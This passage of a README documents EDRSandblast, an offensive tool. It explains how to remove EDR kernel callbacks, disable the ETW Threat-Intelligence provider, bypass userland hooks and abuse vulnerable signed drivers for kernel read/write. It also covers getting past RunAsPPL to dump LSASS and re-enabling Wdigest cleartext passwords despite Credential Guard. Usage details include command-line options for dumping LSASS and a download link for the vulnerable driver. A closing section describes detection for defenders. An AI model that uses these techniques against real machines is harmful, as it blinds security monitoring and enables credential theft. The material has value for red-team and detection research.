* `Enabled` is either `TRUE` or `FALSE` (*don't laugh, a `BOOL` is an `int`, so it could be anything other than `1` or `0`*);
* `Operations` is `OB_OPERATION_HANDLE_CREATE`,  `OB_OPERATION_HANDLE_DUPLICATE` or both;
* `ObjectType` points on `PsProcessType` or `PsThreadType`.

#### Unlinking the `CallbackList` of threads and process
Another strategy that do not rely on an undocumented structure (and is thus theoretically
more robust against NT kernel changes) is the unlinking of the whole `CallbackList`
for both processes and threads. The `_OBJECT_TYPE` object is the following:
```C
struct _OBJECT_TYPE {
	LIST_ENTRY TypeList;
	UNICODE_STRING Name;
	[...]
	_OBJECT_TYPE_INITIALIZER TypeInfo;
	[...]
	LIST_ENTRY CallbackList;
}
```
Making the `Flink` and `Blink` pointers of the `CallbackList` `LIST_ENTRY` point to
the `LIST_ENTRY` itself effectively make the list empty. Since the `_OBJECT_TYPE` structure
is published in the kernel' symbols, the technique does not rely on hardcoded offsets/structures.
However, it has some drawbacks.

The first being not able to only disable callbacks from EDR; indeed, the technique affects
all object callbacks that could have been registered by "legitimate" software. It should
nevertheless be noted that object callbacks are not used by any pre-installed component
on Windows 10 (at the time of writing) so disabling them should not affect the machine
stability (even more so if the disabling is only temporary).

The second drawback is that process or thread handle operation are really frequent (nearly
continuous) in the normal functioning of the OS. As such, if the kernel write primitive used
cannot perform a `QWORD` write "atomically", there is a good chance that the
`_OBJECT_TYPE.CallbackList.Flink` pointer will be accessed by the kernel in the middle
of its overwriting. For instance, the MSI vulnerable driver `RTCore64.sys` can only perform
a `DWORD` write at a time, so 2 distinct IOCTLs will be needed to overwrite the pointer, between
which the kernel has a high probability of using it (resulting in a crash). On the other hand,
the vulnerable DELL driver `DBUtil_2_3.sys` can perform writes of arbitrary sizes in one
IOCTL, so using this method with it does not risk causing a crash.

#### Disabling object callbacks altogether
One last technique we found was to disable entirely the object callbacks support for thread
and processes. Inside the `_OBJECT_TYPE` structure corresponding to the process and
thread types resides a `TypeInfo` field, following the documented `_OBJECT_TYPE_INITIALIZER`
structure. The latter contains a `ObjectTypeFlags` bit field, whose `SupportsObjectCallbacks`
flag determines if the described object type (Process, Thread, Desktop, Token, File, etc.)
supports object callback registering or not. As previously stated, only Process, Thread and
Desktop object types supports these callbacks on a Windows installation at the time of writing.

Since the `SupportsObjectCallbacks` bit is checked by `ObpCreateHandle` or
`ObDuplicateObject` before even reading the `CallbackList` (and before executing
callbacks, of course), flipping the bit at kernel runtime effectively disable all object callbacks
execution.

The main drawback of the method is simply that *KPP* ("*PatchGuard*") monitors the integrity
of some (all ?) `_OBJECT_TYPE` structures, and triggers a [`0x109 Bug Check`](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check-0x109---critical-structure-corruption)
with parameter 4 being equal to `0x8`, meaning an object type structure has been altered.

However, performing the disabling / re-enabling (and "malicious" action in-between) quickly
enough should be enough to "race" *PatchGuard* (unless you are unlucky and a periodic
check is performed just at the wrong moment).

### EDR bypass through deactivation of the ETW Microsoft-Windows-Threat-Intelligence provider

The `ETW Microsoft-Windows-Threat-Intelligence` provider logs data about the
usages of some Windows API commonly used maliciously. This include the
`nt!MiReadWriteVirtualMemory` API, called by `nt!NtReadVirtualMemory` (which is
used to dump `LSASS` memory) and monitored by the `nt!EtwTiLogReadWriteVm`
function.

EDR products can consume the logs produced by the `ETW TI` provider through
services or processes running as, respectively,
`SERVICE_LAUNCH_PROTECTED_ANTIMALWARE_LIGHT` or
`PS_PROTECTED_ANTIMALWARE_LIGHT`, and associated with an `Early Launch Anti
Malware (ELAM)` driver.

As published by
[`slaeryan` in a `CNO Development Labs` blog post](https://public.cnotools.studio/bring-your-own-vulnerable-kernel-driver-byovkd/exploits/data-only-attack-neutralizing-etwti-provider),
the `ETW TI` provider can be disabled altogether by patching, in kernel memory,
its `ProviderEnableInfo` attribute to `0x0`. Refer to the great aforementioned
blog post for more information on the technique.

Similarly to the Kernel callbacks removal, the necessary `ntoskrnl.exe` offsets
(`nt!EtwThreatIntProvRegHandleOffset`, `_ETW_REG_ENTRY`'s `GuidEntry`, and
`_ETW_GUID_ENTRY`'s `ProviderEnableInfo`) are computed in the
`NtoskrnlOffsets.csv` file for a number of the Windows Kernel versions.

### EDR bypass through userland hooking bypass
#### How userland hooking works
In order to easily monitor actions that are performed by processes, EDR products often
deploy a mechanism called *userland hooking*. First, EDR products register a kernel
callback (usually *image loading* or *process creation* callbacks, see above) that allows
them to be notified upon each process start.


When a process is loaded by Windows, and before it actually starts, the EDR is able to
inject some custom DLL into the process address space, which contains its monitoring
logic. While loading, this DLL injects "*hooks*" at the start of every function that is to
be monitored by the EDR. At runtime, when the monitored functions are called by the
process under surveillance, these hooks redirect the control flow to some supervision code
present in the EDR's DLL, which allows it to inspect arguments and return values of these
calls.

Most of the time, monitored functions are system calls (such as `NtReadVirtualMemory`,
`NtOpenProcess`, etc.), whose implementations reside in `ntdll.dll`. Intercepting calls to
`Nt*` functions allows products to be as close as possible to the userland / kernel-land
boundary (while remaining in userland), but functions from some higher-level DLLs may also
be monitored as well.

Bellow are examples of the same function, before and after beeing hooked by the EDR product:
```assembly
NtProtectVirtualMemory   proc near
	mov r10, rcx
	mov eax, 50h
	test byte ptr ds:7FFE0308h, 1
	jnz short loc_18009D1E5
	syscall
	retn
loc_18009D1E5:
	int 2Eh
	retn
NtProtectVirtualMemory   endp			
```

```assembly
NtProtectVirtualMemory proc near
	jmp     sub_7FFC74490298     ; --> "hook", jump to EDR analysis function
	int 3                        ; overwritten instructions
	int 3                        ; overwritten instructions
	int 3                        ; overwritten instructions
	test byte_7FFE0308, 1        ; <-- execution resumes here after analysis
	jnz short loc_7FFCB44AD1E5
	syscall
	retn
loc_7FFCB44AD1E5:
	int 2Eh
	retn
NtProtectVirtualMemory   endp			
```

#### Hooks detection
Userland hooks have the "weakness" to be located in userland memory, which means they are
directly observable and modifiable by the process under scrutiny. To automatically detect
hooks in the process address space, the main idea is to compare the differences between
the original DLL on disk and the library residing in memory, that has been potentially
altered by an EDR. To perform this comparison, the following steps are followed by
EDRSandblast:
* The list of all loaded DLLs is enumerated thanks to the `InLoadOrderModuleList` located
  int the `PEB` (to avoid calling any API that could be monitored and suspicious)
* For each loaded DLL, its content on disk is read and its headers parsed. The
  corresponding library, residing in memory, is also parsed to identify sections, exports,
  etc.
* Relocations of the DLL are parsed and applied, by taking the base address of the
  corresponding loaded library into account. This allows the content of both the in-memory
  library and DLL originating from disk to have the exact same content (on sections where
  relocations are applied), and thus making the comparison reliable.
* Exported functions are enumerated and the first bytes of the "in-memory" and "on-disk"
  versions are compared. Any difference indicates an alteration that has been made after
  the DLL was loaded, and thus is very probably an EDR hook.

Note: The process can be generalized to find differences anywhere in non-writable sections
and not only at the start of exported functions, for example if EDR products start to
apply hooks in the middle of function :) Thus not used by the tool, this has been
implemented in `findDiffsInNonWritableSections`.


In order to bypass the monitoring performed by these hooks, multiples techniques are
possible, and each has benefits and drawbacks.

#### Hook bypass using ... unhooking
The most intuitive method to bypass the hook-based monitoring is to remove the
hooks. Since the hooks are present in memory that is reachable by the process itself, to
remove a hook, the process can simply:
* Change the permissions on the page where the hook is located (RX -> RWX or RW)
* Write the original bytes that are known thanks to the on-disk DLL content
* Change back the permissions to RX

This approach is fairly simple, and can be used to remove every detected hook all at
once. Performed by an offensive tool at its beginning, this allows the rest of the code to
be completely unaware of the hooking mechnanism and perform normally without being
monitored.

However, it has two main drawbacks. The EDR is probably monitoring the use of
`NtProtectVirtualMemory`, so using it to change the permissions of the page where the
hooks have been installed is (at least conceptually) a bad idea. Also, if a thread is
executed by the EDR and periodically check the integrity of the hooks, this could also
trigger some detection.

For implementation details, check the `unhook()` function's code path when `unhook_method` is
`UNHOOK_WITH_NTPROTECTVIRTUALMEMORY`.

**Important note: for simplicity, this technique is implemented in EDRSandblast as the
base technique used to *showcase* the other bypass techniques; each of them demonstrates
how to obtain an unmonitored version of `NtProtectVirtualMemory`, but performs the same
operation afterward (unhooking a specific hook).**

#### Hook bypass using a custom trampoline
To bypass a specific hook, it is possible to simply "jump over" and execute the rest of
the function as is. First, the original bytes of the monitored function, that have been
overwritten by the EDR to install the hook, must be recovered from the DLL file. In our
previous code example, this would be the bytes corresponding to the following
instructions:

```assembly
mov r10, rcx
mov eax, 50h
```

Identifying these bytes is a simple task since we are able to perform a clean *diff* of
both the memory and disk versions of the library, as previously described. Then, we
assemble a jump instruction that is built to redirect the control flow to the code
following immediately the hook, at address `NtProtectVirtualMemory +
sizeof(overwritten_instructions)`

```assembly
jmp NtProtectVirtualMemory+8
```

Finally, we concatenate these opcodes, store them in (newly) executable memory and keep a
pointer to them. This object is called a "*trampoline*" and can then be used as a function
pointer, strictly equivalent to the original `NtProtectVirtualMemory` function.

The main benefit of this technique as for every techniques bellow, is that the hook is
never erased, so any integrity check performed on the hooks by the EDR should
pass. However, it requires to allocate writable then executable memory, which is typical
of a shellcode allocation, thus attracting the EDR's scrutiny.

For implementation details, check the `unhook()` function's code path when `unhook_method` is
`UNHOOK_WITH_INHOUSE_NTPROTECTVIRTUALMEMORY_TRAMPOLINE`. Please remember the technique is
only showcased in our implementation and is, in the end, used to **remove** hooks from
memory, as every technique bellow.

#### Hook bypass using the own EDR's trampoline
The EDR product, in order for its hook to work, must save somewhere in memory the opcodes
that it has removed. Worst (*or "better", from the attacker point of view*), to
effectively use the original instructions the EDR has probably allocated itself a
*trampoline* somewhere to execute the original function after having intercepted the call.

This trampoline can be searched for and used as a replacement for the hooked function,
without the need to allocate executable memory, or call any API except `VirtualQuery`,
which is most likely not monitored being an innocuous function.

To find the trampoline in memory, we browse the whole address space using `VirtualQuery`
looking for commited and executable memory. For each such region of memory, we scan it to
look for a jump instruction that targets the address following the overwritten
instructions (`NtProtectVirtualMemory+8` in our previous example). The trampoline can then
be used to call the hooked function without triggering the hook.

This technique works surprisingly well as it recovers nearly all trampolines on tested
EDR. For implementation details, check the `unhook()` function's code path when
`unhook_method` is `UNHOOK_WITH_EDR_NTPROTECTVIRTUALMEMORY_TRAMPOLINE`.


#### Hook bypass using duplicate DLL
Another simple method to get access to an unmonitored version of `NtProtectVirtualMemory`
function is to load a duplicate version of the `ntdll.dll` library into the process address
space. Since two identical DLLs can be loaded in the same process, provided they have
different names, we can simply copy the legitimate `ntdll.dll` file into another location,
load it using `LoadLibrary` (or reimplement the loading process), and access the function
using `GetProcAddress` for example.

This technique is very simple to understand and implement, and have a decent chance of
success, since most of EDR products does not re-install hooks on newly loaded DLLs once
the process is running. However, the major drawback is that copying Microsoft signed
binaries under a different name is often considered as suspicious by EDR products as
itself.

This technique is nevertheless implemented in `EDRSandblast`. For implementation details, check
the `unhook()` function's code path when `unhook_method` is
`UNHOOK_WITH_DUPLICATE_NTPROTECTVIRTUALMEMORY`.


#### Hook bypass using direct syscalls
In order to use system calls related functions, one program can reimplement syscalls (in
assembly) in order to call the corresponding OS features without actually touching the
code in `ntdll.dll`, which might be monitored by the EDR.  This completely bypasses any
userland hooking done on syscall functions in `ntdll.dll`.

This nevertheless has some drawbacks. First, this implies being able to know the list of
syscall numbers of functions the program needs, which changes for each version of
Windows. This is nevertheless mitigated by implementing multiple heuristics that are known
to work in all the past versions of Windows NT (sorting `ntdll`'s' `Zw*` exports, searching
for `mov rax, #syscall_number` instruction in the associated `ntdll` function, etc.),
and checking they all return the same result (see `Syscalls.c` for more details).

Also, functions that are not technically syscalls
(e.g. `LoadLibraryX`/`LdrLoadDLL`) could be monitored as well, and cannot simply be
reimplemented using a syscall.

The direct syscalls technique is implemented in EDRSandblast. As previously stated, it is only used to
execute `NtProtectVirtualMemory` safely, and remove all detected hooks.

For implementation details, check the `unhook()` function's code path when `unhook_method` is
`UNHOOK_WITH_DIRECT_SYSCALL`.

### Vulnerable drivers exploitation
As previously stated, every action that needs a kernel memory read or write relies on a
vulnerable driver to give this primitive. In EDRSanblast, adding the support for a new
driver providing the read/write primitive can be "easily" done, only three functions
need to be implemented:
* A `ReadMemoryPrimitive_DRIVERNAME(SIZE_T Size, DWORD64 Address, PVOID Buffer)` function, that copies `Size` bytes from kernel address `Address` to userland buffer `Buffer`;
* A `WriteMemoryPrimitive_DRIVERNAME(SIZE_T Size, DWORD64 Address, PVOID Buffer)` function, that copies `Size` bytes from userland buffer `Buffer` to kernel address `Address`;
* A `CloseDriverHandle_DRIVERNAME()` that ensures all handles to the driver are closed (needed before uninstall operation which is driver-agnostic, for the moment).

As an example, two drivers are currently supported by EDRSandblast, `RTCore64.sys`
(SHA256: `01AA278B07B58DC46C84BD0B1B5C8E9EE4E62EA0BF7A695862444AF32E87F1FD`)
and `DBUtils_2_3.sys` (SHA256: `0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5`).
The following code in `KernelMemoryPrimitives.h` is to be updated if the used
vulnerable driver needs to be changed, or if a new one implemented.

```C
#define RTCore 0
#define DBUtil 1
// Select the driver to use with the following #define
#define VULN_DRIVER RTCore

#if VULN_DRIVER == RTCore
#define DEFAULT_DRIVER_FILE TEXT("RTCore64.sys")
#define CloseDriverHandle CloseDriverHandle_RTCore
#define ReadMemoryPrimitive ReadMemoryPrimitive_RTCore
#define WriteMemoryPrimitive WriteMemoryPrimitive_RTCore
#elif VULN_DRIVER == DBUtil
#define DEFAULT_DRIVER_FILE TEXT("DBUtil_2_3.sys")
#define CloseDriverHandle CloseDriverHandle_DBUtil
#define ReadMemoryPrimitive ReadMemoryPrimitive_DBUtil
#define WriteMemoryPrimitive WriteMemoryPrimitive_DBUtil
#endif
```

### EDR drivers and processes detection
Multiple techniques are currently used to determine if a specific driver or process belongs
to an EDR product or not.

First, the name of the driver can simply be used for that purpose. Indeed, Microsoft
allocates specific numbers called "Altitudes" for all drivers that need to insert callbacks
in the kernel. This allow a deterministic order in callbacks execution, independent from
the registering order, but only based on the driver usage. A list of (vendors of) drivers
that have reserved specific *altitude* can be found
[on MSDN](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/allocated-altitudes).
As a consequence, a nearly comprehensive list of security driver names tied to security
products is offered by Microsoft, mainly in the "FSFilter Anti-Virus" and "FSFilter Activity
Monitor" lists. These lists of driver names are embedded in EDRSandblast, as well as
additional contributions.

Moreover, EDR executables and DLL are more than often digitally signed using the
vendors signing certificate. Thus, checking the signer of an executable or DLL associated
to a process may   allow to quickly identify EDR products.

Also, drivers need to be directly signed by Microsoft to be allowed to be loaded in
kernel space. While the driver's vendor is not directly the signer of the driver itself,
it would seam that the vendor's name is still included inside an attribute of the signature;
this detection technique is nevertheless yet to be investigated and implemented.

Finally, when facing an EDR unknown to EDRSandblast, the best approach is to run
the tool in "audit" mode, and check the list of drivers having registered kernel callbacks;
then the driver's name can be added to the list, the tool recompiled and re-run.

### RunAsPPL bypass

The `Local Security Authority (LSA) Protection` mechanism, first introduced
in Windows 8.1 and Windows Server 2012 R2, leverage the `Protected Process
Light (PPL)` technology to restrict access to the `LSASS` process. The `PPL`
protection regulates and restricts operations, such as memory injection or
memory dumping of protected processes, even from a process holding the
`SeDebugPrivilege` privilege. Under the process protection model, only
processes running with higher protection levels can perform operations on
protected processes.

The `_EPROCESS` structure, used by the Windows kernel to represent a process
in kernel memory, includes a `_PS_PROTECTION` field defining the protection level
of a process through its `Type` (`_PS_PROTECTED_TYPE`) and `Signer` (`_PS_PROTECTED_SIGNER`)
attributes.

By writing in kernel memory, the EDRSandblast process is able to upgrade its own
protection level to `PsProtectedSignerWinTcb-Light`. This level is sufficient to
dump the `LSASS` process memory, since it "dominates" to `PsProtectedSignerLsa-Light`,
 the protection level of the `LSASS` process running with the `RunAsPPL` mechanism.

`EDRSandBlast` implements the self protection as follow:
  - open a handle to the current process
  - leak all system handles using `NtQuerySystemInformation` to find the opened
    handle on the current process, and the address of the current process'
    `EPROCESS` structure in kernel memory.
  - use the arbitrary read / write vulnerability of the `Micro-Star MSI
    Afterburner` driver to overwrite the `_PS_PROTECTION` field of the current
    process in kernel memory. The offsets of the `_PS_PROTECTION` field
    relative to the `EPROCESS` structure (defined by the `ntoskrnl` version in
    use) are computed in the `NtoskrnlOffsets.csv` file.

### Credential Guard bypass

Microsoft `Credential Guard` is a virtualization-based isolation technology,
introduced in Microsoft's `Windows 10 (Enterprise edition)` which prevents
direct access to the credentials stored in the `LSASS` process.

When `Credentials Guard` is activated, an `LSAIso` (*LSA Isolated*) process is
created in `Virtual Secure Mode`, a feature that leverages the virtualization
extensions of the CPU to provide added security of data in memory. Access to
the `LSAIso` process are restricted even for an access with the
`NT AUTHORITY\SYSTEM` security context. When processing a hash, the `LSA`
process perform a `RPC` call to the `LSAIso` process, and waits for the
`LSAIso` result to continue. Thus, the `LSASS` process won't contain any
secrets and in place will store `LSA Isolated Data`.

As stated in original research conducted by `N4kedTurtle`: "`Wdigest` can be
enabled on a system with Credential Guard by patching the values of
`g_fParameter_useLogonCredential` and `g_IsCredGuardEnabled` in memory".
The activation of `Wdigest` will result in cleartext credentials being stored
in `LSASS` memory for any new interactive logons (without requiring a reboot of
the system). Refer to the
[original research blog post](https://teamhydra.blog/2020/08/25/bypassing-credential-guard/)
for more details on this technique.

`EDRSandBlast` simply make the original PoC a little more opsec friendly and
provide support for a number of `wdigest.dll` versions (through computed
offsets for `g_fParameter_useLogonCredential` and `g_IsCredGuardEnabled`).

### Offsets retrieval
In order to reliably perform kernel monitoring bypass operations, EDRSandblast needs
to know exactly where to read and write kernel memory. This is done using offsets of
global variables inside the targeted image (ntoskrnl.exe, wdigest.dll), as well as offset
of specific fields in structures whose definitions are published by Microsoft in symbol
files. These offsets are specific to each build of the targeted images, and must be gathered
at least once for a specific platform version.

The choice of using "hardcoded" offsets instead of pattern searches to locate the structures
and variables used by EDRSandblast is justified by the fact that the undocumented APIs
responsible for Kernel callbacks addition / removal are subject to change and that any attempt
to read or write Kernel memory at the wrong address may (and often will) result in a
`Bug Check` (`Blue Screen of Death`). A machine crash is not acceptable in both
red-teaming and normal penetration testing scenarios, since a machine that crashes
is highly visible by defenders, and will lose any credentials that was still in memory at
the moment of the attack.

To retrieve offsets for each specific version of Windows, two approaches are implemented.

#### Manual offset retrieval
The required `ntoskrnl.exe` and `wdigest.dll` offsets can be extracted using the
provided `ExtractOffsets.py` Python script, that relies on `radare2`  and `r2pipe`
to download and parse symbols from PDB files, and extracted the needed offsets from
them. Offsets are then stored in CSV files for later use by EDRSandblast.

In order to support out-of-the-box a wide range of Windows builds, many versions of
the `ntoskrnl.exe` and `wdigest.dll` binaries are referenced by
[Winbindex](https://winbindex.m417z.com/) , and can be automatically downloaded
(and their offsets extracted) by the `ExtractOffsets.py`. This allows to extract offsets
from nearly all files that were ever published in Windows update packages (to date 450+
`ntoskrnl.exe` and 30+ `wdigest.dll` versions are available and pre-computed).

#### Automatic offsets retrieval and update
An additionnal option has been implemented in `EDRSandBlast` to allow the program
to download the needed `.pdb` files itself from Microsoft Symbol Server, extract the
required offsets, and even update the corresponding `.csv` files if present.

Using the `--internet` option make the tool execution much simpler, while introducing
an additionnal OpSec risk, since a `.pdb` file is downloaded and dropped on disk during
the process. This is required by the `dbghelp.dll` functions used to parse the symbols
database ; however, full in-memory PDB parsing might be implemented in the future to
lift this requirement and reduce the tool's footprint.

## Usage

The vulnerable `RTCore64.sys` driver can be retrieved at:

```
http://download-eu2.guru3d.com/afterburner/%5BGuru3D.com%5D-MSIAfterburnerSetup462Beta2.zip
```

### Quick usage

```
Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard> [--usermode [--unhook-method <N>]] [--kernelmode] [--dont-unload-driver] [--dont-restore-callbacks] [--driver <RTCore64.sys>] [--service <SERVICE_NAME>] [--nt-offsets <NtoskrnlOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--add-dll <dll name or path>]* [-o | --dump-output <DUMP_FILE>]
```

### Options

```
-h | --help             Show this help message and exit.
-v | --verbose          Enable a more verbose output.

Actions mode:

        audit           Display the user-land hooks and / or Kernel callbacks without taking actions.
        dump            Dump the LSASS process, by default as 'lsass' in the current directory or at the
                        specified file using -o | --output <DUMP_FILE>.
        cmd             Open a cmd.exe prompt.
        credguard       Patch the LSASS process' memory to enable Wdigest cleartext passwords caching even if
                        Credential Guard is enabled on the host. No kernel-land actions required.

--usermode              Perform user-land operations (DLL unhooking).
--kernelmode            Perform kernel-land operations (Kernel callbacks removal and ETW TI disabling).

--unhook-method <N>
   Choose the userland un-hooking technique, from the following:

        1 (Default)     Uses the (probably monitored) NtProtectVirtualMemory function in ntdll to remove all
                        present userland hooks.
        2               Constructs a 'unhooked' (i.e. unmonitored) version of NtProtectVirtualMemory, by
                        allocating an executable trampoline jumping over the hook, and remove all present
                        userland hooks.
        3               Searches for an existing trampoline allocated by the EDR itself, to get an 'unhooked'
                        (i.e. unmonitored) version of NtProtectVirtualMemory, and remove all present userland
                        hooks.
        4               Loads an additional version of ntdll library into memory, and use the (hopefully
                        unmonitored) version of NtProtectVirtualMemory present in this library to remove all
                        present userland hooks.
        5               Allocates a shellcode that uses a direct syscall to call NtProtectVirtualMemory,
                        and uses it to remove all detected hooks

Other options:

--dont-unload-driver                    Keep the vulnerable driver installed on the host
                                        Default to automatically unsinstall the driver.
--dont-restore-callbacks                Do not restore the EDR drivers' Kernel Callbacks that were removed.
                                        Default to restore the callbacks.

--driver <RTCore64.sys>                 Path to the vulnerable driver file.
                                        Default to 'RTCore64.sys' in the current directory.
--service <SERVICE_NAME>                Name of the vulnerable service to intall / start.

--nt-offsets <NtoskrnlOffsets.csv>      Path to the CSV file containing the required ntoskrnl.exe's offsets.
                                        Default to 'NtoskrnlOffsets.csv' in the current directory.
--wdigest-offsets <WdigestOffsets.csv>  Path to the CSV file containing the required wdigest.dll's offsets
                                        (only for the 'credguard' mode).
                                        Default to 'WdigestOffsets.csv' in the current directory.

--add-dll <dll name or path>            Loads arbitrary libraries into the process' address space, before starting
                                        anything. This can be useful to audit userland hooking for DLL that are not
                                        loaded by default by this program. Use this option multiple times to load
                                        multiple DLLs all at once.
                                        Example of interesting DLLs to look at: user32.dll, ole32.dll, crypt32.dll,
                                        samcli.dll, winhttp.dll, urlmon.dll, secur32.dll, shell32.dll...

-o | --output <DUMP_FILE>               Output path to the dump file that will be generated by the 'dump' mode.
                                        Default to 'lsass' in the current directory.

-i | --internet                         Enables automatic symbols download from Microsoft Symbol Server
                                        If a corresponding *Offsets.csv file exists, appends the downloaded offsets to the file for later use
                                        OpSec warning: downloads and drops on disk a PDB file for ntoskrnl.exe and/or wdigest.dll

```

### Build

`EDRSandBlast` (x64 only) was built on Visual Studio 2019 (Windows SDK
Version: `10.0.19041.0` and Plateform Toolset: `Visual Studio 2019 (v142)`).

### ExtractOffsets.py usage

Note that `ExtractOffsets.py` has only be tested on Windows.

```
# Installation of Python dependencies
pip.exe install -m .\requirements.txt

# Script usage
ExtractOffsets.py [-h] -i INPUT [-o OUTPUT] [-d] mode

positional arguments:
  mode                  ntoskrnl or wdigest. Mode to download and extract offsets for either ntoskrnl or wdigest

optional arguments:
  -h, --help            show this help message and exit
  -i INPUT, --input INPUT
                        Single file or directory containing ntoskrnl.exe / wdigest.dll to extract offsets from.
                        If in download mode, the PE downloaded from MS symbols servers will be placed in this folder.
  -o OUTPUT, --output OUTPUT
                        CSV file to write offsets to. If the specified file already exists, only new ntoskrnl versions will be
                        downloaded / analyzed.
                        Defaults to NtoskrnlOffsets.csv / WdigestOffsets.csv in the current folder.
  -d, --download         Flag to download the PE from Microsoft servers using list of versions from winbindex.m417z.com.
```


## Detection
From the defender (EDR vendor, Microsoft, SOC analysts looking at EDR's telemetry, ...) point of view, multiple indicators can be used to detect or prevent this kind of techniques.

### Driver whitelisting
Since every action performed by the tool in kernel-mode memory relies on a vulnerable driver to read/write arbitrary content, driver loading events should be heaviliy scrutinized by EDR product (or SOC analysts), and raise an alert at any uncommon driver loading, or even block known vulnerable drivers. This latter approach is even [recommended by Microsoft themselves](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules): any HVCI (*Hypervisor-protected code integrity*) enabled Windows device embeds a drivers blocklist, and this will be progressively become a default behaviour on Windows (it already is on Windows 11).

### Kernel-memory integrity checks
Since an attacker could still use an unknown vulnerable driver to perform the same actions in memory, the EDR driver could periodically check that its kernel callbacks are still registered, directly by inspecting kernel memory (like this tool does), or simply by triggering events (process creation, thread creation, image loading, etc.) and checking the callback functions are indeed called by the executive kernel.

As a side note, this type of data structure could be protected via the recent [Kernel Data Protection (KDP)](https://www.microsoft.com/security/blog/2020/07/08/introducing-kernel-data-protection-a-new-platform-security-technology-for-preventing-data-corruption/) mechanism, which relies on Virtual Based Security, in order to make the kernel callbacks array non-writable without calling the right APIs.

The same logic could apply to sensitive ETW variables such as the `ProviderEnableInfo`, abused by this tool to disable the ETW Threat Intelligence events generation.

### User-mode detection
The first indicator that a process is actively trying to evade user-land hooking is the file accesses to each DLL corresponding to loaded modules; in a normal execution, a userland process rarely needs to read DLL files outside of a `LoadLibrary` call, especially `ntdll.dll`.

In order to protect API hooking from being bypassed, EDR products could periodically check that hooks are not altered in memory, inside each monitored process.

Finally, to detect hooking bypass (abusing a trampoline, using direct syscalls, etc.) that does not imply the hooks removal, EDR products could potentially rely on kernel callbacks associated to the abused syscalls (ex. `PsCreateProcessNotifyRoutine` for `NtCreateProcess` syscall, `ObRegisterCallbacks` for `NtOpenProcess` syscall, etc.), and perform user-mode call-stack analysis in order to determine if the syscall was triggered from a normal path (`kernel32.dll` -> `ntdll.dll` -> syscall) or an abnormal one (ex. `program.exe` -> direct syscall).


## Acknowledgements

- Kernel callbacks enumeration and removal:
  https://github.com/br-sn/CheekyBlinder

- Kernel memory Read / Write primitives through the vulnerable
  `Micro-Star MSI Afterburner` driver:
  https://github.com/Barakat/CVE-2019-16098/

- Disabling of the ETW Threat Intelligence provider:
  https://public.cnotools.studio/bring-your-own-vulnerable-kernel-driver-byovkd/exploits/data-only-attack-neutralizing-etwti-provider

- Driver install / uninstall: https://github.com/gentilkiwi/mimikatz

- Initial list of EDR drivers names:
  https://github.com/SadProcessor/SomeStuff/blob/master/Invoke-EDRCheck.ps1

- Credential Guard bypass by re-enabling `Wdigest` through `LSASS` memory
  patching: https://teamhydra.blog/2020/08/25/bypassing-credential-guard/


## Authors

[Thomas DIOT (Qazeer)](https://github.com/Qazeer/)
[Maxime MEIGNAN (themaks)](https://github.com/themaks)

## Licence

CC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/

```